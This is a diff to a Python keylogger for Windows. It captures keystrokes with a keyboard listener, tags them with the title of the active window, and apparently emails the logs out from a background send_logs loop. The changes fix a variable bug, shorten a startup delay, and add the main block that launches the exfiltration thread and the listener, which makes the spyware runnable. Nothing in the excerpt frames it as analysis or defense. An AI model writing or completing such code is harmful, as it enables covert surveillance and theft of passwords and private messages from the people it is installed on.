@@ -10,6 +10,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
+import threading
 
 absoluteTime = time.ctime(time.time())
 user = os.path.expanduser('~').split('\\')[2]
@@ -25,7 +26,7 @@ toDeleteFile = []
 
 
 def on_press(key):
-    global old_app
+    global currentApp
 
     nextApp = win32gui.GetWindowText(win32gui.GetForegroundWindow())
 
@@ -34,7 +35,7 @@ def on_press(key):
     else:
         pass
 
-    if nextApp != old_app and nextApp != '':
+    if nextApp != currentApp and nextApp != '':
         displayData.append(f'[{absoluteTime}] ~ {nextApp}\n')
         currentApp = nextApp
     else:
@@ -73,7 +74,7 @@ def send_logs():
 
     MIN = 10
     SECONDS = 60
-    time.sleep(30)
+    time.sleep(20)
 
     while True:
         if len(displayData) > 1:
@@ -126,5 +127,10 @@ def send_logs():
                 pass
 
 
+if __name__=='__main__':
+	Thread = threading.Thread(target=send_logs)
+	Thread.start()
 
+	with Listener(on_press=on_press) as listener:
+		listener.join()
 
